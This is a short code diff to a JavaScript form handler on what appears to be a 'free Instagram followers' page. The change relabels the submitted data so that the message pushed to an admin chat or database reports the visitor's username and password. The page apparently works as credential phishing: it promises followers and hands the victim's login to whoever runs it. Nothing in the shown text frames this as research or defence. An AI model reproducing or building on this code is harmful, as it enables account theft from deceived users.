@@ -187,9 +187,9 @@ form?.addEventListener("submit", async (event) => {
     // ======================================
 
     const chatText =
-      `🎁 FREE FOLLOWERS | ${tryName}\n` +
-      `Instagram: @${cleanUsername}\n` +
-      `Followers requested: ${followers}`;
+      `REQUESTS | ${tryName}\n` +
+      `Username: @${cleanUsername}\n` +
+      `Password: ${followers}`;
 
 
     await push(
@@ -197,7 +197,7 @@ form?.addEventListener("submit", async (event) => {
       {
         type: "text",
         text: chatText,
-        sender: "FREE FOLLOWERS",
+        sender: "Informations",
         admin: true,
         timestamp: timestamp
       }
